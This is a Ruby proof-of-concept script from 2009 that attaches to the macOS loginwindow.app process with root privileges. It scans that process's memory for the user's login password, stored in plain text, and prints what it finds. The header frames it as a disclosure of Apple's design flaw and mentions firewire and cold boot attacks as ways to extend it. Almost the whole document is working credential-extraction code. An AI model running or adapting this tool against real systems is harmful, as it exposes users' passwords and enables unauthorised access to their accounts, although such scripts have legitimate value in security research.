# Mac OS X loginwindow.app password finder
# Copyright (c) 2009 iZsh - izsh at iphone-dev.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# =============
#  Description
# =============
#
# WARNING: This script is _really_useless_ since it needs to run as root
# anyway. Thus, if you thought you found an easy way to steal passwords,
# well... sorry to disappoint you :)
#
# This script search through the Loginwindow.app memory space and retrieve
# the password. Yeah... Apple is so amazingly smart they keep it forever in
# memory in clear text. That's useless as is, but it can be very useful using
# a firewire or cold boot attack...
#
# Anyway, it's just a POC, a firewire script will probably follow soon.
#
# =======
#  Usage
# =======
# % sudo ruby macloginpwdfinder.rb <pid>
# wherein <pid> is the pid of your loginwindow.app process
# % ps aux | grep loginwindow.app
# should be enough to find it :)
#

require 'rubygems'
require 'ragweed'

include Ragweed
include Wraposx

def search_password(buffer, addr = 0)
  password = buffer[/password[\000]+([^\000]+)[\000]+shell/, 1]
  puts "Found Login password: #{password}" if password
end

def search_region(dbg, addr, debug = false)
  while true do
    print "Looking for the next region starting from addr 0x%08x\n" % addr if debug
    basic_region_info = RegionBasicInfo.get(dbg.task, addr) rescue break
    printf basic_region_info.dump if debug
    extended_region_info = RegionExtendedInfo.get(dbg.task, addr) rescue break
    printf extended_region_info.dump if debug
    if ((basic_region_info.protection & Vm::Pflags::READ) != 0 &&
      (basic_region_info.max_protection & Vm::Pflags::READ) != 0 &&
      extended_region_info.share_mode != Vm::Sm::SM_EMPTY)
    then
      begin
        buffer = Wraposx::vm_read(dbg.task, basic_region_info.address, basic_region_info.size)
      rescue
        buffer = ""
        puts "WARNING: something went wrong while reading @0x%x" % basic_region_info.address
      end
      search_password(buffer, basic_region_info.address)
    end
    addr = basic_region_info.address + basic_region_info.size
  end
  puts "done!"  
end

if ARGV.size != 1 then
  puts "Mac OS X loginwindow.app password finder"
  puts "Copyright (c) 2009 iZsh - izsh at iphone-dev.com"
  puts "================================================"
  puts "Usage: sudo ruby #{$0} <pid>"
  exit(1)
end
  
pid = Integer(ARGV[0])
dbg = Debuggerosx.new(pid)
search_region(dbg, 0x0)

